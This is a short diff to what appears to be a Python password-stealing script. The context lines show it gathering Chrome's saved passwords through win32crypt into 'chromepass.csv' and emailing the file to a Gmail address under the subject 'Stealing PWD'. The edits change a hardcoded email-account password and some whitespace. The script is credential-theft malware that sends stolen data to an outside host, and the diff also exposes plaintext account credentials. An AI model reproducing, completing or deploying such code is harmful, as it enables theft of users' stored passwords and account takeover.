@@ -23,7 +23,7 @@ emailfrom = "pathakrohit8190@gmail.com"
 emailto = "pathakrohit08@gmail.com"
 fileToSend = ".\chromepass.csv"
 username = "pathakrohit8190"
-password = "rohit8190"
+password = "test@8190"
 
 try:
     import win32crypt
@@ -61,7 +61,7 @@ def send_mail():
     msg["From"] = emailfrom
     msg["To"] = emailto
     msg["Subject"] = "Stealing PWD"
-    
+
 
     ctype, encoding = mimetypes.guess_type(fileToSend)
     if ctype is None or encoding is not None:
